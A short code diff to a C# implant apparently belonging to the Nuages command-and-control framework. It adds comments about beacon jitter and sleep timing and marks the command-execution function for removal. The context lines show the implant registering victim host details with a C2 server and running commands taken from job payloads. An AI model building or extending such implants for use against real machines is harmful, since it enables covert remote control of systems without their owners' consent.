@@ -121,7 +121,7 @@ namespace NuagesSharpImplant
                 try {
                     this.config["id"] = connector.RegisterImplant(type: this.type, hostname: this.hostname, username: this.username, localIp: this.localIp, os: this.os, handler: this.handler, connectionString: this.connectionString, config: this.config, supportedPayloads: this.supportedPayloads);
                     int sleep = 1000 * Int32.Parse(this.config["sleep"]);
-                    int jitter = rnd.Next((int)(sleep * 0.7), (int)(sleep * 1.3));
+                    int jitter = rnd.Next((int)(sleep * 0.7), (int)(sleep * 1.3)); //30% by default
                     System.Threading.Thread.Sleep(jitter);
                 }
                 catch (Exception e){
@@ -147,7 +147,7 @@ namespace NuagesSharpImplant
             }
         }
 
-
+        //earmark for "removal"
         void do_command(JsonObject job) {
             string jobId = job["_id"];
             string cmd = job["payload"]["options"]["cmd"];
@@ -816,7 +816,7 @@ namespace NuagesSharpImplant
         public void Start()
         {
             this.Register();
-            int sleep = 5000;
+            int sleep = 5000;   //default is 5 sec. Probably want to push out more
             while (true)
             {
                 try
